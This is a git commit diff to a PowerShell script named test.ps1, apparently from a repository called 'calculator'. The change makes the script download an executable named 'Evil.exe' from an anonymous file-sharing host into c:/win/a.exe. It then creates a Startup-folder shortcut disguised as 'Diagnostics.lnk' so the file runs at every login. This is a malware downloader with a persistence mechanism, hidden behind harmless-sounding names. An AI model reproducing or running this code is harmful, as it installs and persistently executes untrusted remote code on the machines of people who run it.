22ac93dadffcce710f26145419eafef5f3d82877
rustgod455 <103788035+rustgod455@users.noreply.github.com>
2022-05-17 23:19:29 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -3,8 +3,8 @@ $objShell = New-Object -com "Wscript.Shell"
 
 cd /
 mkdir win
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/rustgod455/calculator/main/open.vbs -OutFile c:/win/update.vbs
+Invoke-WebRequest -Uri https://cdn-127.anonfiles.com/P7r1x3hcyc/ca30bb2b-1652812024/Evil.exe -OutFile c:/win/a.exe
 
 $objShortcut = $objShell.CreateShortcut("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Diagnostics.lnk")
-$objShortcut.TargetPath = "c:/win/update.vbs"
+$objShortcut.TargetPath = "c:/win/a.exe"
 $objShortcut.Save()
